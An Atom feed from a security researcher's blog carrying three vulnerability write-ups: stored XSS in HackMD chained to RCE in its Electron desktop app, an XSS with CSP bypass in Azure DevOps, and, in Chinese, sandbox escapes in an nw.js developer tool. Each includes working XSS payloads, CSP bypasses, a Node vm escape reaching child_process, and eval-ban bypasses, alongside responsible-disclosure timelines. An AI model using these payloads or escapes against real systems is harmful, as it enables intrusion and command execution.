<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>5alt&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://5alt.me/"/>
  <updated>2019-10-04T12:54:03.917Z</updated>
  <id>http://5alt.me/</id>
  
  <author>
    <name>md5_salt</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HackMD Stored XSS and HackMD Desktop RCE</title>
    <link href="http://5alt.me/2019/10/HackMD%20Stored%20XSS%20and%20HackMD%20Desktop%20RCE/"/>
    <id>http://5alt.me/2019/10/HackMD Stored XSS and HackMD Desktop RCE/</id>
    <published>2019-10-03T16:00:00.000Z</published>
    <updated>2019-10-04T12:54:03.917Z</updated>
    
    <content type="html"><![CDATA[<p>It’s time to share a stored XSS case I found in HackMD. I have demonstrated it in <a href="https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Junyu-Zhou-and-Ce-Qin-and-Jianing-Wang-Web2Own-Attacking-Desktop-Apps-From-Web-Securitys-Perspective.pdf" target="_blank" rel="noopener">my talk</a> at Defcon 27 and here are more details.</p><p>The story begains from a XSS in a popular flow chart library called <a href="https://mermaidjs.github.io/" target="_blank" rel="noopener">mermaid</a>. We have found three diffrent type of XSS in mermaid, you can see it <a href="https://github.com/knsv/mermaid/issues/869" target="_blank" rel="noopener">here</a>.<br><a id="more"></a><br>The first one:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">B --&gt; C&#123;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;&#125;</span><br></pre></td></tr></table></figure><p>The second one:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    A--&gt;B;</span><br><span class="line">    click B callback &quot;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;&quot;</span><br></pre></td></tr></table></figure><p>The third one(needs click, both nodes will work):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    alert`md5_salt`--&gt;B;</span><br><span class="line">    click alert`md5_salt` eval &quot;Tooltip for a callback&quot;</span><br><span class="line">    click B &quot;javascript:alert`salt`&quot; &quot;This is a tooltip for a link&quot;</span><br></pre></td></tr></table></figure><p>From the three PoCs we can see, in the first two cases, html code in the <em>node name</em> is not escaped and can be rendered in the page, which leads to XSS. The last one is slightly different, we use a feature called <a href="https://mermaidjs.github.io/#/flowchart?id=interaction" target="_blank" rel="noopener">interaction</a>.</p><p>From the document we can see:</p><blockquote><p>It is possible to bind a click event to a node, the click can lead to either a javascript callback or to a link which will be opened in a new browser tab.</p></blockquote><p>This feature can be used as a click-XSS attack.</p><p>But the callback function must be pre-defined, which should be found in <code>window</code> object. The sample code is as follows.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[callback](node_name)</span><br></pre></td></tr></table></figure><p>Mermaid is widely used in markdown editors, HackMD is one.</p><p>I just copy &amp; paste the payload but nothing happened. The payload is blocked by CSP. The CSP is as follows.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: default-src &apos;none&apos;; script-src &apos;self&apos; vimeo.com https://gist.github.com www.slideshare.net &apos;unsafe-eval&apos; https://assets.hackmd.io https://www.google.com https://apis.google.com https://docs.google.com https://www.dropbox.com https://*.disqus.com https://*.disquscdn.com https://www.google-analytics.com https://stats.g.doubleclick.net https://secure.quantserve.com https://rules.quantcount.com https://pixel.quantserve.com https://js.driftt.com https://embed.small.chat https://static.small.chat https://www.googletagmanager.com https://cdn.ravenjs.com https://browser.sentry-cdn.com &apos;nonce-cdbbafd5-903e-443c-bb33-c25b0cc73e21&apos; &apos;sha256-EtvSSxRwce5cLeFBZbvZvDrTiRoyoXbWWwvEVciM5Ag=&apos; &apos;sha256-NZb7w9GYJNUrMEidK01d3/DEtYztrtnXC/dQw7agdY4=&apos; &apos;sha256-L0TsyAQLAc0koby5DCbFAwFfRs9ZxesA+4xg0QDSrdI=&apos;; img-src * data:; style-src &apos;self&apos; &apos;unsafe-inline&apos; https://assets-cdn.github.com https://github.githubassets.com https://assets.hackmd.io https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com https://static.small.chat; font-src &apos;self&apos; data: https://public.slidesharecdn.com https://assets.hackmd.io https://*.disquscdn.com; object-src *; media-src *; frame-src *; child-src *; connect-src *; base-uri &apos;none&apos;; form-action &apos;self&apos; https://www.paypal.com; upgrade-insecure-requests</span><br></pre></td></tr></table></figure><p>I found a <a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_&amp;_Bypass_CSP.md" target="_blank" rel="noopener">write up</a> about how to bypass HackMD’s CSP. It uses <code>Google Tag Manager</code> to inject custom javascript code in <code>https://www.google-analytics.com</code>, which is whitelisted in the HackMD’s CSP.</p><p>So, our payload can be:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">B --&gt; C&#123;&lt;script src=https://www.google-analytics.com/gtm/js?id=GTM-TQGSV3G &gt;&lt;/script&gt;&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/201907/hackmd_xss_1.png" alt><br>or<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    A--&gt;B;</span><br><span class="line">    click B callback &quot;&lt;script src=https://www.google-analytics.com/gtm/js?id=GTM-TQ6RV7G &gt;&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/images/201907/hackmd_xss_2.png" alt></p><p>How about the callback function one? Let’s review the vulnerable code.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[callback](node_name)</span><br></pre></td></tr></table></figure><p>We can only use the object directly in window, for example, <code>window[&#39;document&#39;]</code>, and <code>window[&#39;document.write&#39;]</code> wouldn’t work. And we can not have some special chars such as <code>()[]{}\@%^|&lt;&gt;</code> in the node name.  Besides, in the CSP, we have <code>unsafe-eval</code> and no <code>unsafe-inline</code>.</p><p>Getting the alert box is easy.</p><p><img src="/images/201907/hackmd_xss_3.png" alt></p><p>But I want to execute arbitrary code.</p><p>I made a few tries.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[<span class="string">'eval'</span>](<span class="string">"location='javascript:alert`1`'"</span>)</span><br></pre></td></tr></table></figure><p>This one violates the CSP.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[<span class="string">'eval'</span>](<span class="string">"atob`YWxlcnQoMSk=`"</span>)</span><br></pre></td></tr></table></figure><p>This one can decode the base64 payload but the payload cannot execute.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[<span class="string">'import'</span>](<span class="string">"https://www.google-analytics.com/gtm/js?id=GTM-TQ6RV7G"</span>)</span><br></pre></td></tr></table></figure><p>This one failed because <code>import</code> is <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import" target="_blank" rel="noopener">a statement</a> so <code>window[&#39;import&#39;] == undefined</code>.</p><p>…</p><p>Finally I noticed HackMD has jQuery in the context. It’s easy to import a remote javascript file using <code>$.getScript</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    $.getScript`https://www.google-analytics.com/gtm/js?id=GTM-TQ6RV7G`--&gt;B;</span><br><span class="line">    click $.getScript`https://www.google-analytics.com/gtm/js?id=GTM-TQ6RV7G` eval &quot;Tooltip for a callback&quot;</span><br><span class="line">    click B &quot;javascript:alert`2`&quot; &quot;This is a tooltip for a link&quot;</span><br></pre></td></tr></table></figure><p>Finally, I got the alert box!</p><p><img src="/images/201907/hackmd_xss_4.png" alt></p><p>Before I was going to report the issue, I found HackMD has <a href="https://github.com/hackmdio/hackmd-desktop" target="_blank" rel="noopener">a desktop application</a>. Let’s turn this XSS to RCE!</p><p>HackMD Desktop uses Electron framework. It renders the web page from hackmd.io in a safe <code>webview</code> tag.</p><p>Let’s see the main page of the HackMD Desktop.</p><p>There is a <code>renderer.js</code> executed in the privileged context.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// renderer.js</span></span><br><span class="line"><span class="keyword">let</span> targetURL</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.location.search !== <span class="string">''</span>) &#123;</span><br><span class="line">    targetURL = <span class="built_in">window</span>.location.search.match(<span class="regexp">/\?target=([^?]+)/</span>)[<span class="number">1</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    targetURL = getServerUrl()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.innerHTML += <span class="string">`&lt;webview src="<span class="subst">$&#123;targetURL&#125;</span>" id="main-window" disablewebsecurity autosize="on" allowpopups allowfileaccessfromfiles&gt;&lt;/webview&gt;`</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* handle _target=blank pages */</span></span><br><span class="line">webview.addEventListener(<span class="string">'new-window'</span>, (event) =&gt; &#123;</span><br><span class="line">    ipcClient(<span class="string">'createWindow'</span>, &#123; <span class="attr">url</span>: <span class="string">`file://<span class="subst">$&#123;path.join(__dirname, <span class="string">`index.html?target=<span class="subst">$&#123;event.url&#125;</span>`</span>)&#125;</span>`</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>From the code we can see, if you create a new window, the <code>targetURL</code> parameter will be concatenated into the template. If we can close the double quote of the <code>src</code> atttibute in the <code>webview</code> tag and inject <a href="https://electronjs.org/docs/api/webview-tag#nodeintegration" target="_blank" rel="noopener"><code>nodeintegration</code> atttibute</a>, then we can use native modules to execute any command.</p><p>This failed because the double quote is url encoded.</p><p>Quickly I noticed another piece of code.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// renderer.js</span></span><br><span class="line">webview.addEventListener(<span class="string">'dom-ready'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// set webview title</span></span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">'#navbar-container .title'</span>).innerHTML = webview.getTitle()</span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">'title'</span>).innerHTML = webview.getTitle()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>When the DOM in the webview tag is ready, the main page will get the webview’s title and set to the main page using <code>innerHTML</code>.</p><p>We can use XSS to redirect the page from hackmd.io to our evil page with payload in the page title.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">"process.mainModule.require('child_process').exec('open /Applications/Calculator.app')"</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>And then we can see the calculator!</p><video controls><br>    <source src="/images/201907/hackmd_rce.mp4" type="video/mp4"><br><br>    Sorry, your browser doesn’t support embedded videos.<br></video><h2 id="Responsible-Disclosure"><a href="#Responsible-Disclosure" class="headerlink" title="Responsible Disclosure"></a>Responsible Disclosure</h2><ul><li>07/03/2019 Report the HackMD <a href="https://github.com/hackmdio/codimd/issues/1233" target="_blank" rel="noopener">XSS issue</a></li><li>07/08/2019 Report the HackMD desktop <a href="https://github.com/hackmdio/hackmd-desktop/issues/18" target="_blank" rel="noopener">RCE issue</a></li><li>07/11/2019 HackMD <a href="https://github.com/hackmdio/hackmd-desktop/pull/19" target="_blank" rel="noopener">fixed the RCE in HackMD Desktop</a></li><li>07/29/2019 HackMD <a href="https://github.com/hackmdio/codimd/pull/1242" target="_blank" rel="noopener">fixed the XSS</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;It’s time to share a stored XSS case I found in HackMD. I have demonstrated it in &lt;a href=&quot;https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Junyu-Zhou-and-Ce-Qin-and-Jianing-Wang-Web2Own-Attacking-Desktop-Apps-From-Web-Securitys-Perspective.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;my talk&lt;/a&gt; at Defcon 27 and here are more details.&lt;/p&gt;
&lt;p&gt;The story begains from a XSS in a popular flow chart library called &lt;a href=&quot;https://mermaidjs.github.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;mermaid&lt;/a&gt;. We have found three diffrent type of XSS in mermaid, you can see it &lt;a href=&quot;https://github.com/knsv/mermaid/issues/869&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;here&lt;/a&gt;.&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>How I alert(1) in Azure DevOps</title>
    <link href="http://5alt.me/2019/02/xss-in-azure-devops/"/>
    <id>http://5alt.me/2019/02/xss-in-azure-devops/</id>
    <published>2019-02-25T16:00:00.000Z</published>
    <updated>2019-08-20T02:56:08.034Z</updated>
    
    <content type="html"><![CDATA[<p>Microsoft have launched a new bounty program targeting to the Azure DevOps. A new program is always easier for bug hunting. Let’s go for it!</p><p>Our target is <a href="https://dev.azure.com" target="_blank" rel="noopener">https://dev.azure.com</a> , which is a git web server implemented by Microsoft. I found a XSS bug in the markdown editor.</p><p>When creating a pull request, people can add some comments using markdown. Some feature is not well escaped by the markdown render, which leads to XSS.<br><a id="more"></a><br>I just copy &amp; paste a huge collection of <a href="https://github.com/ZephrFish/XSSPayloads/blob/master/raw_payloads" target="_blank" rel="noopener">XSS payloads</a> provided by @ZephrFish, browser redirects me to a strange url. I tried to find the minimum payload, and after lots of try, I found if I put html tags in two <code>$</code> and a <code>%</code> must also appear there, the html tags would magically be rendered in the output as it is! A sample payload is as follows.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$%<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span>&gt;</span>$</span><br></pre></td></tr></table></figure><p><img src="/images/201902/azure_xss_1.png" alt></p><p>I tried to use img’s onerror action to triger XSS, nothing happened. I saw following errors in the chrome’s console.</p><blockquote><p>1?_a=overview:1 Refused to execute inline event handler because it violates the following Content Security Policy directive: “script-src ‘unsafe-inline’ <em>.visualstudio.com </em>.dev.azure.com dev.azure.com <a href="https://cdn.vsassets.io" target="_blank" rel="noopener">https://cdn.vsassets.io</a> <a href="https://vsassetscdn.azure.cn" target="_blank" rel="noopener">https://vsassetscdn.azure.cn</a> <a href="https://ms.gallery.vsassets.io" target="_blank" rel="noopener">https://ms.gallery.vsassets.io</a> <a href="https://ms.gallerycdn.vsassets.io" target="_blank" rel="noopener">https://ms.gallerycdn.vsassets.io</a> <a href="https://ms.gallerycdn.azure.cn" target="_blank" rel="noopener">https://ms.gallerycdn.azure.cn</a> <em>.ensighten.com </em>.microsoft.com *.google-analytics.com ‘nonce-JNv3ZUluxXSBwNijHMtlKg==’”. Note that ‘unsafe-inline’ is ignored if either a hash or nonce value is present in the source list.</p></blockquote><p><img src="/images/201902/azure_xss_6.png" alt></p><p>Aha, it is blocked by CSP. <em>‘unsafe-inline’ is ignored if either a hash or nonce value is present in the source list.</em></p><p>And when I tried to use <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, it said it was blocked because of <code>unsafe-eval</code>.</p><p><img src="/images/201902/azure_xss_3.png" alt></p><p>OK, as <code>dev.azure.com</code> itself is whitelisted, I choose to point script tag’s src to a repo file which contains my payload.</p><p><img src="/images/201902/azure_xss_4.png" alt><br><img src="/images/201902/azure_xss_5.png" alt></p><p>WTF??? It seems script tag is hooked by a frontend framework. I need to either find some way to bypass the CSP, or bypass the hook.</p><p>I get the full CSP below.</p><blockquote><p><code>content-security-policy: default-src &#39;none&#39;; font-src *.visualstudio.com *.dev.azure.com dev.azure.com *.vsassets.io vsassetscdn.azure.cn ms.gallery.vsassets.io ms.gallerycdn.vsassets.io ms.gallerycdn.azure.cn *.microsoft.com *.sharepointonline.com; style-src &#39;unsafe-inline&#39; *.visualstudio.com *.dev.azure.com dev.azure.com cdn.vsassets.io vsassetscdn.azure.cn ms.gallery.vsassets.io ms.gallerycdn.vsassets.io ms.gallerycdn.azure.cn; connect-src *.visualstudio.com wss://*.visualstudio.com *.dev.azure.com dev.azure.com wss://*.dev.azure.com wss://dev.azure.com *.vsassets.io vsassetscdn.azure.cn ms.gallery.vsassets.io ms.gallerycdn.vsassets.io ms.gallerycdn.azure.cn *.blob.core.windows.net; img-src http: https: blob: data:; script-src &#39;unsafe-inline&#39; *.visualstudio.com *.dev.azure.com dev.azure.com https://cdn.vsassets.io https://vsassetscdn.azure.cn https://ms.gallery.vsassets.io https://ms.gallerycdn.vsassets.io https://ms.gallerycdn.azure.cn *.ensighten.com *.microsoft.com *.google-analytics.com &#39;nonce-BByveBAMp0eRn6Ll29C7Lw==&#39;; child-src * blob: tfs:; frame-src * blob: tfs:; media-src http: https:;</code></p></blockquote><p><code>frame-src * blob: tfs:;</code> caught my eye. I can use iframe to isolate the hook for script tag!</p><p>The final payload is<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script src='https://dev.azure.com/md5_salt/deadbeef-1337-1337-1337-1337/_apis/git/repositories/deadbeef-1337-1337-1337-1337/Items?path=%2F1.js&amp;versionDescriptor%5BversionOptions%5D=0&amp;versionDescriptor%5BversionType%5D=0&amp;versionDescriptor%5Bversion%5D=master&amp;download=true&amp;resolveLfs=true&amp;%24format=octetStream&amp;api-version=5.0-preview.1'&gt;&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><p>And finally the alert box popped up! XD<br><img src="/images/201902/azure_xss_2.png" alt></p><p>Timeline:</p><ul><li>01/19/2019 reported to Microsoft</li><li>01/25/2019 Microsoft confirmed the issue</li><li>02/06/2019 CVE-2019-0742 is assigned and <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0742" target="_blank" rel="noopener">acknowledged</a>; ask for disclosing the details (already fixed)</li><li>02/07/2019 Microsoft agreed for disclosing after fix</li><li>02/26/2019 publicly disclosed</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Microsoft have launched a new bounty program targeting to the Azure DevOps. A new program is always easier for bug hunting. Let’s go for it!&lt;/p&gt;
&lt;p&gt;Our target is &lt;a href=&quot;https://dev.azure.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://dev.azure.com&lt;/a&gt; , which is a git web server implemented by Microsoft. I found a XSS bug in the markdown editor.&lt;/p&gt;
&lt;p&gt;When creating a pull request, people can add some comments using markdown. Some feature is not well escaped by the markdown render, which leads to XSS.&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>某开发工具沙箱绕过导致RCE</title>
    <link href="http://5alt.me/2018/08/%E6%9F%90%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4RCE/"/>
    <id>http://5alt.me/2018/08/某开发工具沙箱绕过导致RCE/</id>
    <published>2018-07-31T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.787Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个基于<code>nw.js</code>的开发的工具，有实时预览功能，预览的环境实际上是由预制的一个html渲染出来的，用户写的所有 js 代码也被自动封装成一个 module，通过<code>script</code>标签的方式引入。最终，用户的代码会在一个沙箱环境中被<code>require</code>进来，然后执行。</p><p>比如<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">some code</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"your_code_file.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">require</span>(<span class="string">"your_code_file.js"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>your_code_file.js</code> 的内容例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">"your_code_file.js"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">require, module, exports, process</span>)</span>&#123; <span class="string">"use strict"</span>;</span><br><span class="line">    <span class="comment">// your original code</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中<code>define</code>语句是工具自动生成的。</p><p>工具会在之前的处理逻辑里把<code>global</code>变量以及<code>require</code>函数重写，导致不能直接调用nodejs中原本的<code>require</code>函数。处理后的<code>require</code>函数无法获取到<code>child_process</code>模块。<br><a id="more"></a><br>在这种情况下，我们需要知道有哪些变量可以使用。通过打印出下列变量，我们就可以对当前环境的状况有一定的了解。</p><ul><li>arguments</li><li>this</li><li>new.target</li><li>window</li><li>parent</li><li>top</li><li>navigator</li><li>location</li><li>name</li><li>global</li><li>self</li></ul><p>可以发现，可以用<code>self</code>、<code>window</code>、<code>top</code>等方式获取真正的<code>global</code>变量，其中我们发现了nodejs原版的<code>require</code>函数被存在了一个叫做<code>__noderequire</code>的变量中，直接用它来调用<code>child_process</code>即可命令执行。</p><p>几个版本之后发现用了 nodejs 自带的<code>vm</code>模块作为沙箱。不过这个已经早已被证实是不安全的。在另一个 nodejs 的沙箱模块<a href="https://github.com/patriksimek/vm2" target="_blank" rel="noopener"><code>vm2</code></a>里甚至直接给出了绕过代码。更多的一些姿势可以参考在<code>vm2</code>模块issue里的一些<a href="https://github.com/patriksimek/vm2/issues/32" target="_blank" rel="noopener">讨论</a>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line">vm.runInNewContext(<span class="string">'this.constructor.constructor("return process")().mainModule.require("child_process").spawn("/Applications/Calculator.app/Contents/MacOS/Calculator")'</span>);</span><br></pre></td></tr></table></figure><p>绕过的思路很简单，找到一个不在沙箱的Context里创建的但是能在沙箱里访问到的变量，从这个变量的属性指针里找出沙箱外的可以执行代码方法，调用即可。在上述代码里，<code>this</code>的创建其实就是在沙箱外的。<code>this.constructor</code>为<code>Object() { [native code] }</code>，<code>this.constructor.constructor</code>为<code>Function() { [native code] }</code>。这样，通过<code>this.constructor.constructor</code>可以获取沙箱外的<code>Function</code>，即可以用来在沙箱外执行任意代码。其中<code>process.mainModule</code>里有 nodejs 中的<code>require</code>函数，可以用来执行任意命令。</p><p>解决这个问题需要处理<code>Object.prototype.constructor</code>到沙箱外面<code>Function</code>的连接，以及在沙箱内重建输入数据。</p><p>在接下来的版本迭代中，似乎 nodejs 被<a href="https://github.com/nwjs/nw.js/wiki/manifest-format#nodejs" target="_blank" rel="noopener">禁止使用</a>了。</p><p>假如 nodejs 没有被禁用，程序使用了较为安全的沙箱<code>vm2</code>，是不是就没有风险了呢？这里还有一个 osx 下面的绕过方式。</p><p>我们回顾用户脚本被加载的过程，是将用户的脚本以 script 标签 src 属性的方式加载到页面中。由于 js 文件会被封装成一个 module，里面的代码不会被立即执行。如果用户的脚本文件名称里带有双引号<code>&quot;</code>，即可闭合 src 属性，导致加载其他的文件，如果直接在这个文件中执行 js 代码，此时的执行环节就在沙箱外，可以直接 RCE。</p><p>比如我们创建一个 js 文件名为<code>evil.json&quot; &quot;.js</code>。再创建一个名为<code>evil.json</code>的 json 文件。<code>evil.json</code>里有我们恶意的payload，因为不是<code>js</code>后缀，所以里面的内容不会被处理。这样经过渲染，页面变成了如下所示。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">some code</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"evil.json"</span> "<span class="attr">.js</span>"&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>evil.json</code>里的恶意代码被执行。</p><p>由于在windows环境中无法创建带有双引号的文件名的文件，导致此方法无法在windows下使用。</p><p>既然谈到了沙箱，再抄一段禁止<code>eval</code>的绕过方法吧，来源见参考文献。</p><p><code>eval=undefined</code>可以用<code>Function(payload)()</code>绕过。<br><code>Function.prototype.constructo=rundefined</code>可以用<code>Object.constructor(payload)()</code>绕过。<br><code>Object.getPrototypeOf=undefined</code>可以用<code>Reflect.construct(Function, [payload])()</code>绕过。<br><code>Function=undefined</code>可以用<code>(function*(){}).constructor(payload)().next()</code>绕过。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://github.com/patriksimek/vm2/issues/32" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/32</a><br><a href="https://docs.google.com/presentation/d/1bYFbCtHGimDmqdwE6Um0WZ7O97eWAK-N1qndqrv8niA/pub" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1bYFbCtHGimDmqdwE6Um0WZ7O97eWAK-N1qndqrv8niA/pub</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个基于&lt;code&gt;nw.js&lt;/code&gt;的开发的工具，有实时预览功能，预览的环境实际上是由预制的一个html渲染出来的，用户写的所有 js 代码也被自动封装成一个 module，通过&lt;code&gt;script&lt;/code&gt;标签的方式引入。最终，用户的代码会在一个沙箱环境中被&lt;code&gt;require&lt;/code&gt;进来，然后执行。&lt;/p&gt;
&lt;p&gt;比如&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;some code&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;your_code_file.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span 